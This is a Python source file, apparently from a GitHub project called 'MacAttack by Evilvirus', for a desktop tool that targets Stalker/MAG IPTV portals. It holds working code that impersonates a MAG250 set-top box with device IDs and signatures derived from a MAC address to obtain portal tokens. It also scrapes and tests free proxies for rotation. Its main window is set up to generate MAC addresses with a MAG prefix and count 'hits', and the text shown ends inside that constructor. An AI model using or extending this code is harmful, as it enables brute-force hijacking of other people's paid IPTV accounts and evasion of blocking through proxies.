# TODO:
# Clean up code, remove redundancy
VERSION = "4.7.6"
import semver
import urllib.parse
import webbrowser
import base64
import configparser
import hashlib
import json
import logging
import os
import random
from random import choice
import re
import socket
import sys
import threading
from threading import Lock
import traceback
import time
from datetime import datetime, timezone
from contextlib import contextmanager
from collections import deque

# Add the directory containing libvlc.dll to the PATH
script_dir = os.path.dirname(os.path.abspath(__file__))
os.environ["PATH"] = script_dir + os.pathsep + os.environ.get("PATH", "")
import vlc
from PyQt5.QtCore import (
    QBuffer,
    QByteArray,
    QEasingCurve,
    QEvent,
    QPropertyAnimation,
    Qt,
    QThread,
    QTimer,
    pyqtSignal,
)
from PyQt5.QtGui import (
    QFont,
    QIcon,
    QMouseEvent,
    QPixmap,
    QStandardItem,
    QStandardItemModel,
    QTextCursor,
)
from PyQt5.QtWidgets import (
    QAbstractItemView,
    QApplication,
    QCheckBox,
    QFrame,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QListView,
    QMainWindow,
    QMessageBox,
    QProgressBar,
    QPushButton,
    QSizePolicy,
    QSlider,
    QSpacerItem,
    QSpinBox,
    QTabWidget,
    QTextEdit,
    QVBoxLayout,
    QWidget,
    QFileDialog,
    QRadioButton,
    QButtonGroup,
    QComboBox,
)
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, urlparse, urlunparse

logging.basicConfig(level=logging.ERROR)
portaltype = None
player_portaltype = None


@contextmanager
def no_proxy_environment():
    """Context manager that temporarily unsets environment proxy settings."""
    # Save the original proxy environment variables
    original_http_proxy = os.environ.get("http_proxy")
    original_https_proxy = os.environ.get("https_proxy")
    try:
        # Temporarily remove the environment proxy settings
        if "http_proxy" in os.environ:
            del os.environ["http_proxy"]
        if "https_proxy" in os.environ:
            del os.environ["https_proxy"]
        yield  # Allow the code inside the block to execute
    finally:
        # Restore the original proxy environment variables
        if original_http_proxy is not None:
            os.environ["http_proxy"] = original_http_proxy
        if original_https_proxy is not None:
            os.environ["https_proxy"] = original_https_proxy


def get_token(session, url, mac, timeout=30):
    global player_portaltype
    player_portal_type_detected = None
    player_portaltype = None

    # Get and parse the IPTV link
    parsed_url = urlparse(url)
    parsed_path = parsed_url.path
    logging.debug(parsed_path)
    # Remove the c/ from the path
    if parsed_path.endswith("c"):
        parsed_path = parsed_path[:-1]
    if parsed_path.endswith("c/"):
        parsed_path = parsed_path[:-2]
    logging.debug(parsed_path)
    host = parsed_url.hostname
    port = parsed_url.port or 80
    base_url = f"http://{host}:{port}"
    headers = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Accept-Encoding": "identity",
        "Accept": "*/*",
        "Connection": "keep-alive",
    }

    if not player_portal_type_detected:  # Check for type portal
        version_url = f"{base_url}/c/version.js"
        try:
            response = requests.get(version_url, headers=headers)  # Add headers here
            response.raise_for_status()  # Raise an exception for HTTP errors

            # Extract the version using a regex
            match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
            if match:
                portal_version = match.group(1)  # Extracted version string
                logging.debug(version_url)
                logging.info(
                    f"\n\n\nPortal type: PORTAL version: {portal_version}\n\n\n"
                )
                player_portal_type_detected = "portal"
                logging.info("Portal type selected: Portal")
                player_portaltype = "portal.php"
            else:
                logging.debug("Version declaration not found in the file.")
        except requests.RequestException as e:
            logging.debug(f"Not type PORTAL: {e}")

    if not player_portal_type_detected:  # check for type stalker_portal
        version_url = f"{base_url}/stalker_portal/c/version.js"
        try:
            response = requests.get(version_url, headers=headers)  # Add headers here
            response.raise_for_status()  # Raise an exception for HTTP errors

            # Extract the version using a regex
            match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
            if match:
                portal_version = match.group(1)  # Extracted version string
                logging.debug(version_url)
                logging.info(
                    f"\n\n\nPortal type: STALKER_PORTAL version: {portal_version}\n\n\n"
                )
                player_portal_type_detected = "stalker_portal"
                player_portaltype = "stalker_portal/server/load.php"
            else:
                logging.debug("Version declaration not found in the file.")
        except requests.RequestException as e:
            logging.debug(f"Not type STALKER_PORTAL")

    if not player_portal_type_detected:  # Others failed, default to "portal"
        player_portaltype = "portal.php"
        portal_version = "5.3.1"
        logging.debug(f"Not type STALKER_PORTAL")

    base_url = f"http://{host}:{port}{parsed_path}"

    # If both url and method co1antain "stalker_portal/" then remove it from the url
    if "stalker_portal/" in base_url and "stalker_portal/" in player_portaltype:
        base_url = base_url.replace("stalker_portal/", "")
    logging.debug(base_url)
    logging.debug(player_portaltype)

    handshake_url = f"{url}/{player_portaltype}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
    try:
        serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
        sn = serialnumber[0:13]
        device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
        device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
        hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
        snmac = f"{sn}{mac}"
        sig = hashlib.sha256(snmac.encode()).hexdigest().upper()
        cookies = {
            "adid": hw_version_2,
            "debug": "1",
            "device_id2": device_id2,
            "device_id": device_id,
            "hw_version": "1.7-BD-00",
            "mac": mac,
            "sn": sn,
            "stb_lang": "en",
            "timezone": "America/Los_Angeles",
        }

        headers = {
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
            "Accept-Encoding": "identity",
            "Accept": "*/*",
        }

        response = session.get(
            handshake_url, cookies=cookies, headers=headers, timeout=timeout
        )
        logging.debug(response.headers)
        logging.debug(response.text)
        response.raise_for_status()
        token = response.json().get("js", {}).get("token")
        if token:

            token_random = (
                response.json().get("js", {}).get("random")
            )  # Extract 'random' if present

            if token_random:
                logging.debug(f"RANDOM: {token_random}")
                sig = hashlib.sha256(token_random.encode()).hexdigest().upper()

                metrics = {
                    "mac": mac,
                    "sn": sn,
                    "type": "STB",
                    "model": "MAG250",
                    "uid": device_id,
                    "random": token_random,
                }
                json_string = json.dumps(metrics)
                encoded_string = urllib.parse.quote(json_string)

                logging.debug(encoded_string)
                session.headers.update(
                    {
                        "Connection": "keep-alive",
                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                        "Accept-Encoding": "identity",
                        "Accept": "*/*",
                        "Authorization": f"Bearer {token}", 
                        "X-Random": f"{token_random}",
                    }
                )

                session.cookies.update(
                    {
                        "adid": hw_version_2,
                        "debug": "1",
                        "device_id2": device_id2,
                        "device_id": device_id,
                        "hw_version": "1.7-BD-00",
                        "mac": mac,
                        "sn": sn,
                        "stb_lang": "en",
                        "timezone": "America/Los_Angeles",
                    }
                )

                url1_a = f"{url}/{player_portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: {portal_version}; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp={round(time.time())}&api_sig=262&prehash=0"
                res1_a = session.get(url1_a)

                logging.debug(res1_a.text)

            else:
                token_random = "0"

            logging.info(f"Token retrieved: {token}")
            return (token, token_random)
        else:
            logging.error("Token not found in handshake response.")
            return None, None
    except Exception as e:
        logging.error(f"Error getting token: {e}")
        logging.error(f"Error getting token: {e}")
        return None, None


class SavePoolWorker(QThread):
    save_complete = pyqtSignal()

    def __init__(self, mac_dict, file_name):
        super().__init__()
        self.mac_dict = mac_dict
        self.file_name = file_name

    def run(self):
        mac_list = list(self.mac_dict)

        with open(self.file_name, "w") as file:
            for mac in mac_list:
                file.write(mac + "\n")  # Write each MAC address followed by a newline

        self.save_complete.emit()


class UpdateWorker(QThread):
    update_checked = pyqtSignal(str, str, str)

    def run(self):
        self.get_update()

    def get_update(self):
        url = "https://api.github.com/repos/Evilvir-us/MacAttack/releases/latest"

        try:
            response = requests.get(url)
            response.raise_for_status()
            latest_release = response.json()
            latest_version = latest_release["tag_name"]
            release_url = latest_release["html_url"]
            logging.info(f"Latest version on GitHub: {latest_version}")
            if latest_version.startswith("v"):
                latest_version = latest_version[1:]
            if semver.compare(VERSION, latest_version) < 0:
                logging.info(
                    f"Update available! Current version: {VERSION}, Latest version: {latest_version}"
                )
                self.update_checked.emit(VERSION, latest_version, release_url)
            else:
                logging.info(
                    f"You are up to date! Current version: {VERSION}, Latest version: {latest_version}"
                )

        except requests.RequestException as e:
            logging.error(f"Error fetching update info: {e}")
            self.update_checked.emit("", "", "")  # If Error, return nothing


class ProxyFetcher(QThread):
    update_proxy_output_signal = pyqtSignal(str)
    update_proxy_textbox_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.proxy_fetching_speed = 10
        self.proxy_testing_speed = 100

    def run(self):
        self.fetch_and_test_proxies()

    def fetch_and_test_proxies(self):
        # Fetch proxies
        all_proxies = self.fetch_proxies()
        if not all_proxies:
            self.update_proxy_output_signal.emit(
                "No proxies found, check internet connection."
            )
            return
        original_count = len(all_proxies)
        all_proxies = list(set(all_proxies))  # Remove duplicates
        duplicates_removed = original_count - len(all_proxies)
        self.update_proxy_output_signal.emit(
            f"Total proxies fetched: {original_count}\n"
        )
        self.update_proxy_output_signal.emit(
            f"Duplicates removed: {duplicates_removed}\n"
        )

        # Start tracking time for testing proxies
        start_time = time.time()

        # Test proxies
        working_proxies = []
        self.update_proxy_output_signal.emit("Testing proxies...")
        with ThreadPoolExecutor(max_workers=self.proxy_testing_speed) as executor:
            future_to_proxy = {
                executor.submit(self.test_proxy, proxy): proxy for proxy in all_proxies
            }
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                try:
                    proxy, is_working = future.result()
                    if is_working:
                        self.update_proxy_output_signal.emit(
                            f"Proxy {proxy} is working."
                        )
                        working_proxies.append(proxy)
                    else:
                        self.update_proxy_output_signal.emit(f"Proxy {proxy} failed.")
                except Exception as e:
                    logging.debug(f"Error testing proxy {proxy}: {str(e)}")

        # End tracking time for testing proxies
        end_time = time.time()
        testing_time = end_time - start_time  # Time in seconds

        # Convert seconds to minutes and seconds
        minutes = int(testing_time // 60)
        seconds = int(testing_time % 60)

        # Format testing time as "X Minutes Y Seconds"
        formatted_testing_time = f"{minutes} Minutes {seconds} Seconds"

        if working_proxies:
            self.update_proxy_textbox_signal.emit("\n".join(working_proxies))
            self.update_proxy_output_signal.emit(
                f"██████╗░░█████╗░███╗░░██╗███████╗\n"
                f"██╔══██╗██╔══██╗████╗░██║██╔════╝\n"
                f"██║░░██║██║░░██║██╔██╗██║█████╗░░\n"
                f"██║░░██║██║░░██║██║╚████║██╔══╝░░\n"
                f"██████╔╝╚█████╔╝██║░╚███║███████╗\n"
                f"╚═════╝░░╚════╝░╚═╝░░╚══╝╚══════╝  Testing took {formatted_testing_time}\n"
            )
        else:
            self.update_proxy_output_signal.emit("No working proxies found.")

    def fetch_proxies(self):
        proxies = []
        sources = [
            "https://spys.me/proxy.txt",
            "https://free-proxy-list.net/",
            "https://www.us-proxy.org/",
            "https://www.sslproxies.org/",
            "https://free-proxy-list.net/anonymous-proxy.html",
            "https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=1",
            "https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=2",
            "https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=3",
            "https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=4",
            "https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=5",
        ]
        with ThreadPoolExecutor(max_workers=self.proxy_fetching_speed) as executor:
            futures = {
                executor.submit(self.fetch_from_source, url): url for url in sources
            }
            for future in as_completed(futures):
                source_url = futures[future]
                try:
                    source_proxies = future.result()
                    proxies.extend(source_proxies)
                except Exception as e:
                    self.update_proxy_output_signal.emit(
                        f"Error fetching from {source_url}: {e}"
                    )
        return proxies

    def fetch_from_source(self, url):
        proxies = []
        try:
            with no_proxy_environment():  # Bypass the enviroment proxy set in the video player tab
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    if "spys.me" in url:
                        regex = r"[0-9]+(?:\.[0-9]+){3}:[0-9]+"
                        matches = re.finditer(regex, response.text, re.MULTILINE)
                        proxies.extend([match.group() for match in matches])
                    elif (
                        "free-proxy-list.net" in url
                        or "us-proxy.org" in url
                        or "sslproxies.org" in url
                    ):
                        html_content = response.text
                        ip_port_pattern = re.compile(
                            r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>"
                        )
                        matches = ip_port_pattern.findall(html_content)
                        proxies.extend([f"{ip}:{port}" for ip, port in matches])
                    elif "freeproxy.world" in url:
                        html_content = response.text
                        ip_port_pattern = re.compile(
                            r'<td class="show-ip-div">\s*(\d+\.\d+\.\d+\.\d+)\s*</td>\s*'
                            r'<td>\s*<a href=".*?">(\d+)</a>\s*</td>'
                        )
                        matches = ip_port_pattern.findall(html_content)
                        proxies.extend([f"{ip}:{port}" for ip, port in matches])
        except requests.exceptions.RequestException as e:
            logging.debug(f"Error fetching from {url}: {e}")
        return proxies

    def test_proxy(self, proxy):
        # Check if the returned JSON contains 'user': 'Evilvirus' and that the 'origin' matches the proxy IP.
        url = "http://httpbin.org/anything?user=Evilvirus&application=MacAttack"
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        proxy_ip = urlparse(f"http://{proxy}").hostname

        def try_proxy():
            try:
                with no_proxy_environment():  # Bypass the environment proxy set in the video player tab
                    response = requests.get(url, proxies=proxies, timeout=30)

                    if response.status_code == 200:
                        json_response = response.json()
                        user = json_response.get("args", {}).get("user")
                        origin = json_response.get("origin")
                        logging.info(f"Proxy: {proxy}, Origin: {origin}")

                        # Check if the user is 'Evilvirus' and the origin matches the proxy IP
                        if user == "Evilvirus" and origin == proxy_ip:
                            return True
            except requests.RequestException as e:
                logging.debug(f"Error testing proxy {proxy}: {str(e)}")
            return False

        # Try testing the proxy twice (currently disabled)
        if try_proxy():
            return proxy, True
        # elif try_proxy():  # Retry once more if the first attempt fails
        #    return proxy, True

        return proxy, False


class ProxyTester(QThread):
    update_proxy_output_signal = pyqtSignal(str)
    update_proxy_textbox_signal = pyqtSignal(str)
    clear_textbox_signal = pyqtSignal()

    def __init__(self, proxy_textbox):
        super().__init__()
        self.proxy_textbox = proxy_textbox

    def run(self):
        self.test_proxies()

    def test_proxies(self):
        # Extract proxies from the text box
        proxies = self.proxy_textbox.toPlainText().splitlines()

        # Strip empty lines
        proxies = [proxy.strip() for proxy in proxies if proxy.strip()]

        if not proxies:
            self.update_proxy_output_signal.emit("No proxies in the text box.")
            return

        self.update_proxy_output_signal.emit("Testing proxies...")

        working_proxies = []

        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_proxy = {
                executor.submit(self.test_proxy, proxy): proxy for proxy in proxies
            }
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                try:
                    proxy, is_working = future.result()
                    if is_working:
                        self.update_proxy_output_signal.emit(
                            f"Proxy {proxy} is working."
                        )
                        working_proxies.append(proxy)
                    else:
                        self.update_proxy_output_signal.emit(f"Proxy {proxy} failed.")
                except Exception as e:
                    logging.debug(f"Error testing proxy {proxy}: {str(e)}")
        logging.debug(f"Working proxies: {working_proxies}")
        self.clear_textbox_signal.emit()  # Clear the textbox
        # Remove Dupes
        working_proxies = list(set(working_proxies))
        logging.debug(f"Unique working proxies: {working_proxies}")

        if working_proxies:
            # Emit the list of working proxies to the main thread
            self.update_proxy_textbox_signal.emit("\n".join(working_proxies))
            self.update_proxy_output_signal.emit("Done!")
        else:
            self.update_proxy_output_signal.emit("No working proxies found.")

    def test_proxy(self, proxy):
        url = "http://httpbin.org/anything?user=Evilvirus&application=MacAttack"
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

        # Extract the IP address from the proxy, ignoring the port
        proxy_ip = urlparse(f"http://{proxy}").hostname

        try:
            with no_proxy_environment():  # Bypass the environment proxy set in the video player tab
                response = requests.get(url, proxies=proxies, timeout=30)

                # Check for a successful response and if the returned JSON contains the user value
                if response.status_code == 200:
                    json_response = response.json()
                    user = json_response.get("args", {}).get("user")
                    origin = json_response.get("origin")

                    # Log the proxy and origin values
                    logging.info(f"Proxy: {proxy}, Origin: {origin}")

                    # Check if the user is 'Evilvirus' and the origin matches the proxy IP (ignoring the port)
                    if user == "Evilvirus" and origin == proxy_ip:
                        logging.debug(f"Proxy {proxy} passed the test")
                        return proxy, True
                    else:
                        logging.debug(f"Proxy {proxy} failed the test")
                        return proxy, False
        except requests.RequestException as e:
            logging.debug(f"Error testing proxy {proxy}: {str(e)}")

        logging.debug(f"Proxy {proxy} failed due to exception")
        return proxy, False


class RequestThread(QThread):
    request_complete = pyqtSignal(dict)  # Signal to emit when request is complete
    update_progress = pyqtSignal(int)  # Signal to emit progress updates
    channels_loaded = pyqtSignal(list)  # Signal to emit channels when loaded

    def __init__(
        self,
        base_url,
        mac,
        session,
        token,
        token_random,
        category_type=None,
        category_id=None,
        num_threads=5,
    ):
        super().__init__()
        self.base_url = base_url
        self.mac = mac
        self.session = session
        self.token = token
        self.token_random = token_random
        self.category_type = category_type
        self.category_id = category_id
        self.num_threads = num_threads

    def run(self):
        try:
            logging.debug("RequestThread started.")
            session = self.session
            url = self.base_url
            mac = self.mac
            token = self.token
            token_random = self.token_random

            # Define cookies and headers for subsequent requests, including the token
            serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
            sn = serialnumber[0:13]
            device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
            device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
            hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
            cookies = {
                "adid": hw_version_2,
                "debug": "1",
                "device_id2": device_id2,
                "device_id": device_id,
                "hw_version": "1.7-BD-00",
                "mac": mac,
                "sn": sn,
                "stb_lang": "en",
                "timezone": "America/Los_Angeles",
                "token": token,
            }

            headers = {
                "Connection": "keep-alive",
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) "
                "AppleWebKit/533.3 (KHTML, like Gecko) "
                "MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                "Authorization": f"Bearer {token}", 
            }

            if token_random:
                logging.debug(f"RANDOM:{token_random}")

                headers = {
                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                    "Accept-Encoding": "identity",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Authorization": f"Bearer {token}",
                    "X-Random": f"{token_random}",
                }

                cookies = {
                    "adid": hw_version_2,
                    "debug": "1",
                    "device_id2": device_id2,
                    "device_id": device_id,
                    "hw_version": "1.7-BD-00",
                    "mac": mac,
                    "sn": sn,
                    "stb_lang": "en",
                    "timezone": "America/Los_Angeles",
                }

            if self.category_type and self.category_id:
                # Fetch channels in a category
                self.update_progress.emit(0)  # Start of channel fetching
                logging.debug("Fetching channels.")
                channels = self.get_channels(
                    session,
                    url,
                    mac,
                    token,
                    token_random,
                    self.category_type,
                    self.category_id,
                    self.num_threads,
                    cookies,
                    headers,
                )
                self.update_progress.emit(100)
                self.channels_loaded.emit(channels)
            else:
                # Fetch playlist (Live, Movies, Series) concurrently
                data = {}
                progress_lock = Lock()
                progress = 0

                with ThreadPoolExecutor(max_workers=1) as executor:
                    futures = {
                        executor.submit(
                            self.get_genres,
                            session,
                            url,
                            mac,
                            token,
                            token_random,
                            cookies,
                            headers,
                        ): "Live",
                        executor.submit(
                            self.get_vod_categories,
                            session,
                            url,
                            mac,
                            token,
                            token_random,
                            cookies,
                            headers,
                        ): "Movies",
                        executor.submit(
                            self.get_series_categories,
                            session,
                            url,
                            mac,
                            token,
                            token_random,
                            cookies,
                            headers,
                        ): "Series",
                    }

                    total_tasks = (
                        len(futures) + 2
                    )  # +2 for get_profile and get_main_info
                    completed_tasks = (
                        2  # Since get_profile and get_main_info are already done
                    )
                    self.update_progress.emit(
                        int((completed_tasks / total_tasks) * 100)
                    )

                    for future in as_completed(futures):
                        tab_name = futures[future]
                        try:
                            result = future.result()
                            data[tab_name] = result
                        except Exception as e:
                            logging.error(f"Error fetching {tab_name}: {e}")
                            data[tab_name] = []
                        finally:
                            with progress_lock:
                                completed_tasks += 1
                                progress_percent = int(
                                    (completed_tasks / total_tasks) * 100
                                )
                                self.update_progress.emit(progress_percent)
                                logging.debug(f"Progress: {progress_percent}%")

                self.request_complete.emit(data)

        except Exception as e:
            logging.error(f"Request thread error: {str(e)}")
            traceback.print_exc()
            self.request_complete.emit({})  # Emit empty data in case of an error
            self.update_progress.emit(0)  # Reset progress on error

    def get_genres(self, session, url, mac, token, token_random, cookies, headers):
        try:
            genres_url = f"{url}/{player_portaltype}?type=itv&action=get_genres&JsHttpRequest=1-xml"
            response = session.get(
                genres_url, cookies=cookies, headers=headers, timeout=10
            )
            logging.debug(response.text)
            response.raise_for_status()
            genre_data = response.json().get("js", [])
            if genre_data:
                genres = [
                    {
                        "name": i["title"],
                        "category_type": "IPTV",
                        "category_id": i["id"],
                    }
                    for i in genre_data
                ]
                # Sort genres alphabetically by name
                genres.sort(key=lambda x: x["name"])
                logging.debug(f"Genres fetched: {genres}")
                return genres
            else:
                logging.warning("No genres data found.")
                return []
        except Exception as e:
            logging.error(f"Error getting genres: {e}")
            self.request_complete.emit({})  # Emit empty data if no genres are found
            return []

    def get_vod_categories(
        self, session, url, mac, token, token_random, cookies, headers
    ):
        try:
            vod_url = f"{url}/{player_portaltype}?type=vod&action=get_categories&JsHttpRequest=1-xml"
            response = session.get(
                vod_url, cookies=cookies, headers=headers, timeout=10
            )
            response.raise_for_status()
            categories_data = response.json().get("js", [])
            if categories_data:
                categories = [
                    {
                        "name": category["title"],
                        "category_type": "VOD",
                        "category_id": category["id"],
                    }
                    for category in categories_data
                ]
                # Sort categories alphabetically by name
                categories.sort(key=lambda x: x["name"])
                logging.debug(f"VOD categories fetched: {categories}")
                return categories
            else:
                logging.warning("No VOD categories data found.")
                return []
        except Exception as e:
            logging.error(f"Error getting VOD categories: {e}")
            return []

    def get_series_categories(
        self, session, url, mac, token, token_random, cookies, headers
    ):
        try:
            series_url = f"{url}/{player_portaltype}?type=series&action=get_categories&JsHttpRequest=1-xml"
            response = session.get(
                series_url, cookies=cookies, headers=headers, timeout=10
            )
            logging.debug(response.text)
            response.raise_for_status()
            response_json = response.json()
            logging.debug(f"Series categories response: {response_json}")
            if not isinstance(response_json, dict) or "js" not in response_json:
                logging.debug("Unexpected response structure for series categories.")
                return []

            categories_data = response_json.get("js", [])
            categories = [
                {
                    "name": category["title"],
                    "category_type": "Series",
                    "category_id": category["id"],
                }
                for category in categories_data
            ]
            # Sort categories alphabetically by name
            categories.sort(key=lambda x: x["name"])
            logging.debug(f"Series categories fetched: {categories}")
            return categories
        except Exception as e:
            logging.error(f"Error getting series categories: {e}")
            return []

    def get_channels(
        self,
        session,
        url,
        mac,
        token,
        token_random,
        category_type,
        category_id,
        num_threads,
        cookies,
        headers,
    ):
        try:
            channels = []
            # First, get total number of items
            logging.debug("get_channels func started")
            page_number = 0
            total_items = None
            initial_url = ""
            if category_type == "IPTV":
                initial_url = f"{url}/{player_portaltype}?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p=0"
                logging.debug(initial_url)
            elif category_type == "VOD":
                initial_url = f"{url}/{player_portaltype}?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p=0"
            elif category_type == "Series":
                initial_url = f"{url}/{player_portaltype}?type=series&action=get_ordered_list&category={category_id}&p=0&JsHttpRequest=1-xml"

            response = session.get(
                initial_url, cookies=cookies, headers=headers, timeout=10
            )
            response.raise_for_status()
            response_json = response.json()
            logging.debug(response.text)

            total_items = int(response_json.get("js", {}).get("total_items", 0))
            items_per_page = len(response_json.get("js", {}).get("data", []))

            # Don't divide by zero
            if items_per_page > 0:
                total_pages = (total_items + items_per_page - 1) // items_per_page
            else:
                total_pages = 0

            # First page data
            channels_data = response_json.get("js", {}).get("data", [])
            for channel in channels_data:
                channel["item_type"] = (
                    "series"
                    if category_type == "Series"
                    else "vod" if category_type == "VOD" else "channel"
                )
            channels.extend(channels_data)
            self.update_progress.emit(int(1 / max(total_pages, 1) * 100))

            # Prepare page numbers to fetch (exclude page 0 which is already fetched)
            if total_pages > 1:
                page_numbers = list(range(1, total_pages))
            else:
                page_numbers = []

            # Use ThreadPoolExecutor to fetch pages concurrently
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = []
                progress_lock = Lock()
                progress = 1  # Already fetched page 0
                for p in page_numbers:
                    if category_type == "IPTV":
                        channels_url = f"{url}/{player_portaltype}?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p={p}"
                    elif category_type == "VOD":
                        channels_url = f"{url}/{player_portaltype}?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p={p}"
                    elif category_type == "Series":
                        channels_url = f"{url}/{player_portaltype}?type=series&action=get_ordered_list&category={category_id}&p={p}&JsHttpRequest=1-xml"
                    else:
                        logging.error(f"Unknown category_type: {category_type}")
                        continue
                    futures.append(
                        executor.submit(
                            self.fetch_page,
                            channels_url,
                            cookies,
                            headers,
                            category_type,
                            p,
                        )
                    )

                total_pages = max(total_pages, 1)
                for future in as_completed(futures):
                    page_channels = future.result()
                    channels.extend(page_channels)
                    # Update progress
                    with progress_lock:
                        progress += 1
                        progress_percent = int((progress / total_pages) * 100)
                        self.update_progress.emit(progress_percent)
                        logging.debug(f"Progress: {progress_percent}%")

            # Deduplicate channels based on their unique identifiers
            unique_channels = {}
            for channel in channels:
                channel_id = channel.get("id")
                if channel_id not in unique_channels:
                    unique_channels[channel_id] = channel
            channels = list(unique_channels.values())

            # Sort channels alphabetically by name
            channels.sort(key=lambda x: x.get("name", ""))
            logging.debug(f"Total channels fetched: {len(channels)}")
            return channels
        except Exception as e:
            logging.error(f"An error occurred while retrieving channels: {str(e)}")
            return []

    def fetch_page(self, url, cookies, headers, category_type, page_number):
        try:
            logging.debug(f"Fetching page {page_number} from URL: {url}")
            session = requests.Session()
            response = session.get(url, cookies=cookies, headers=headers, timeout=10)
            response.raise_for_status()
            response_json = response.json()
            channels_data = response_json.get("js", {}).get("data", [])
            for channel in channels_data:
                channel["item_type"] = (
                    "series"
                    if category_type == "Series"
                    else "vod" if category_type == "VOD" else "channel"
                )
            return channels_data
        except Exception as e:
            logging.error(f"Error fetching page {page_number}: {e}")
            return []


class VideoPlayerWorker(QThread):
    stream_url_ready = pyqtSignal(str)
    error_occurred = pyqtSignal(str)

    def __init__(self, stream_url):
        super().__init__()
        self.stream_url = stream_url
        self.session = requests.Session()

    def run(self):
        try:
            timeout = 30  # seconds
            response = self.session.get(self.stream_url, timeout=timeout)
            if response.status_code == 200:
                # Emit the final stream URL if successful
                self.stream_url_ready.emit(response.url)
            else:
                # Emit error if the request fails
                error_message = f"Failed to load, {response.status_code}"
                self.error_occurred.emit(error_message)
        except requests.Timeout:
            # Handle request timeout
            self.error_occurred.emit("Request timed out")
        except requests.ConnectionError:
            # Handle connection issues (e.g., no internet connection)
            self.error_occurred.emit("Connection error.")
        except Exception as e:
            # Emit error for any other unexpected issues
            if "IncompleteRead" not in str(e):
                self.error_occurred.emit(f"Error: {str(e)}")


class MacAttack(QMainWindow):
    update_mac_label_signal = pyqtSignal(str)
    update_hits_label_signal = pyqtSignal(str)
    update_output_text_signal = pyqtSignal(str)
    update_error_text_signal = pyqtSignal(str)
    macattack_update_proxy_textbox_signal = pyqtSignal(str)
    macattack_update_mac_count_signal = pyqtSignal()

    def __init__(self):
        super().__init__()
        self.proxy_textbox = QTextEdit(self)
        self.proxy_tester = ProxyTester(self.proxy_textbox)
        self.proxy_tester.clear_textbox_signal.connect(self.clear_proxy_textbox)
        self.proxy_tester.update_proxy_textbox_signal.connect(self.update_proxy_textbox)
        self.mac_dict = deque()
        self.generated_count = 0
        self.proxy_error_counts = {}
        self.proxy_error_connect_counts = {}
        self.threads = []
        self.cleaningup = 0
        # Initial VLC instance
        if getattr(sys, "frozen", False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")
        self.instance = vlc.Instance(
            [
                f"--config={base_path}\\include\\vlcrc",
                "--repeat",
                "--no-xlib",
                "--vout=directx",
                "--no-plugins-cache",
                "--log-verbose=1",
            ]
        )
        self.videoPlayer = self.instance.media_player_new()
        self.set_window_icon()
        self.setWindowTitle("MacAttack by Evilvirus")
        self.setGeometry(200, 200, 1138, 522)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.Window)
        self.running = False
        self.threads = []
        self.recentlyfound = []
        self.output_file = None
        self.video_worker = None
        self.current_request_thread = None
        self.last_trim_time = 0
        self.last_error_trim_time = 0
        self.proxy_fetcher = ProxyFetcher()
        self.hourly_timer = None
        self.remaining_time = 3600
        self.customprefix = "00:1A:79:"
        self.proxy_fetcher.update_proxy_output_signal.connect(self.update_proxy_output)
        self.proxy_fetcher.update_proxy_textbox_signal.connect(
            self.update_proxy_textbox
        )
        self.macattack_update_proxy_textbox_signal.connect(
            self.macattack_update_proxy_textbox
        )
        self.macattack_update_mac_count_signal.connect(self.macattack_update_mac_count)
        QApplication.setStyle("Fusion")
